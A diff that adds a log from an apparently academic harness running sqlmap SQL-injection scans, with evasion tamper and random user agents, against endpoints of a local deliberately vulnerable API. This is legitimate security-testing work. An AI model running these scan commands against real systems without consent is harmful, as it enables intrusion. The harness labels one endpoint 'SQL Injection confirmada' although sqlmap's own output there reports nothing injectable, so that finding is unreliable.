+  [00:26:13] [INFO] target URL content is stable
+  [00:26:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:13] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:13 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[9/21] Testando: users_login
+  Método:    POST
+  Path:      /users/v1/login
+  Descrição: Login de usuário
+  Auth:      Não
+  Body:      {"username": "name1", "password": "pass1"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/login" --method=POST --data='{"username": "name1", "password": "pass1"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para users_login
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:13 /2026-06-01/
+  
+  [00:26:14] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:14] [INFO] loading tamper module 'space2comment'
+  [00:26:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:14] [INFO] flushing session file
+  [00:26:14] [INFO] testing connection to the target URL
+  [00:26:14] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:14] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:14] [INFO] testing if the target URL content is stable
+  [00:26:14] [INFO] target URL content is stable
+  [00:26:14] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:14] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:14 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[10/21] Testando: users_login_inject
+  Método:    POST
+  Path:      /users/v1/login
+  Descrição: Login com credenciais de teste (teste injeção)
+  Auth:      Não
+  Body:      {"username": "testuser", "password": "testpass"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/login" --method=POST --data='{"username": "testuser", "password": "testpass"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para users_login_inject
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [.]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:15 /2026-06-01/
+  
+  [00:26:15] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:15] [INFO] loading tamper module 'space2comment'
+  [00:26:15] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:15] [INFO] flushing session file
+  [00:26:15] [INFO] testing connection to the target URL
+  [00:26:15] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:15] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:15] [INFO] testing if the target URL content is stable
+  [00:26:16] [INFO] target URL content is stable
+  [00:26:16] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:16] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:16 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[11/21] Testando: users_me
+  Método:    GET
+  Path:      /me
+  Descrição: Obter dados do usuário autenticado
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/me" --headers="Authorization: Bearer a"
+
+  [?] Resultado inconclusivo para users_me
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:16 /2026-06-01/
+  
+  [00:26:16] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:16] [INFO] loading tamper module 'space2comment'
+  [00:26:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:16] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:16] [INFO] flushing session file
+  [00:26:16] [INFO] testing connection to the target URL
+  [00:26:16] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:26:16] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:26:16 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[12/21] Testando: users_update_email
+  Método:    PUT
+  Path:      /users/v1/name1/email
+  Descrição: Atualizar email do usuário name1
+  Auth:      Sim (Bearer JWT)
+  Body:      {"email": "newemail@test.com"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/name1/email" --method=PUT --data='{"email": "newemail@test.com"}' --headers="Authorization: Bearer a\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para users_update_email
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:17 /2026-06-01/
+  
+  [00:26:17] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:17] [INFO] loading tamper module 'space2comment'
+  [00:26:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:17] [INFO] testing connection to the target URL
+  [00:26:17] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:17] [INFO] testing if the target URL content is stable
+  [00:26:18] [INFO] target URL content is stable
+  [00:26:18] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:18] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:18 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[13/21] Testando: users_update_email_admin
+  Método:    PUT
+  Path:      /users/v1/admin/email
+  Descrição: Atualizar email do admin (teste path param)
+  Auth:      Sim (Bearer JWT)
+  Body:      {"email": "admin_new@test.com"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/admin/email" --method=PUT --data='{"email": "admin_new@test.com"}' --headers="Authorization: Bearer a\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para users_update_email_admin
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:18 /2026-06-01/
+  
+  [00:26:18] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:18] [INFO] loading tamper module 'space2comment'
+  [00:26:18] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:19] [INFO] flushing session file
+  [00:26:19] [INFO] testing connection to the target URL
+  [00:26:19] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:19] [INFO] testing if the target URL content is stable
+  [00:26:19] [INFO] target URL content is stable
+  [00:26:19] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:19] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:19 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[14/21] Testando: users_update_password
+  Método:    PUT
+  Path:      /users/v1/name1/password
+  Descrição: Atualizar senha do usuário name1
+  Auth:      Sim (Bearer JWT)
+  Body:      {"password": "newpass123"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/name1/password" --method=PUT --data='{"password": "newpass123"}' --headers="Authorization: Bearer a\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para users_update_password
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:20 /2026-06-01/
+  
+  [00:26:20] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:20] [INFO] loading tamper module 'space2comment'
+  [00:26:20] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:20] [INFO] flushing session file
+  [00:26:20] [INFO] testing connection to the target URL
+  [00:26:20] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:20] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:20] [INFO] testing if the target URL content is stable
+  [00:26:20] [INFO] target URL content is stable
+  [00:26:20] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:20] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:20 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[15/21] Testando: users_update_password_admin
+  Método:    PUT
+  Path:      /users/v1/admin/password
+  Descrição: Atualizar senha do admin (teste path param)
+  Auth:      Sim (Bearer JWT)
+  Body:      {"password": "newadminpass"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/admin/password" --method=PUT --data='{"password": "newadminpass"}' --headers="Authorization: Bearer a\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para users_update_password_admin
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:21 /2026-06-01/
+  
+  [00:26:21] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:21] [INFO] loading tamper module 'space2comment'
+  [00:26:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:21] [INFO] flushing session file
+  [00:26:21] [INFO] testing connection to the target URL
+  [00:26:21] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:26:21] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:21] [INFO] testing if the target URL content is stable
+  [00:26:22] [INFO] target URL content is stable
+  [00:26:22] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:26:22] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 3 times
+  
+  [*] ending @ 00:26:22 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[16/21] Testando: users_delete
+  Método:    DELETE
+  Path:      /users/v1/name1
+  Descrição: Deletar usuário por username (somente admin)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/users/v1/name1" --method=DELETE --data="" --headers="Authorization: Bearer a"
+
+  [?] Resultado inconclusivo para users_delete
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:22 /2026-06-01/
+  
+  [00:26:22] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:22] [INFO] loading tamper module 'space2comment'
+  [00:26:22] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:23] [INFO] flushing session file
+  [00:26:23] [INFO] testing connection to the target URL
+  [00:26:23] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:26:23] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:26:23 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[17/21] Testando: books_list
+  Método:    GET
+  Path:      /books/v1
+  Descrição: Listar todos os livros
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/books/v1"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em books_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:23 /2026-06-01/
+  
+  [00:26:23] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:23] [INFO] loading tamper module 'space2comment'
+  [00:26:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.155 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:23] [INFO] testing connection to the target URL
+  [00:26:23] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:26:23] [INFO] testing if the target URL content is stable
+  [00:26:24] [INFO] target URL content is stable
+  [00:26:24] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:26:24] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:26:24] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:26:24] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:26:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:26:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:26:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:26:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:26:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:26:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:26:24] [INFO] testing 'Generic inline queries'
+  [00:26:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:26:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:26:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:26:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:26:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:26:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:26:24] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:26:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:26:24] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:26:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:26:24] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:26:24 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[18/21] Testando: books_get_by_title
+  Método:    GET
+  Path:      /books/v1/bookTitle77
+  Descrição: Obter livro por título (path param string)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/books/v1/bookTitle77" --headers="Authorization: Bearer a"
+
+  [?] Resultado inconclusivo para books_get_by_title
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [.]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:25 /2026-06-01/
+  
+  [00:26:25] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:25] [INFO] loading tamper module 'space2comment'
+  [00:26:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139 Version/11.1.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:25] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:25] [INFO] flushing session file
+  [00:26:25] [INFO] testing connection to the target URL
+  [00:26:25] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:26:25] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:26:25 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[19/21] Testando: books_get_by_title_2
+  Método:    GET
+  Path:      /books/v1/bookTitle85
+  Descrição: Obter livro por título (segundo exemplo)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:5002/books/v1/bookTitle85" --headers="Authorization: Bearer a"
+
+  [?] Resultado inconclusivo para books_get_by_title_2
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:26:26 /2026-06-01/
+  
+  [00:26:26] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\vampi_sqlmap_logs\sqlmap_output' as the output directory
+  [00:26:26] [INFO] loading tamper module 'space2comment'
+  [00:26:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:26:26] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:26:26] [INFO] testing connection to the target URL
+  [00:26:26] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:26:26] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:26:26 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[20/21] Testando: books_get_by_title_inject
+  Método:    GET
+  Path:      /books/v1/nonexistent_book
+  Descrição: Obter livro inexistente (teste path param)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
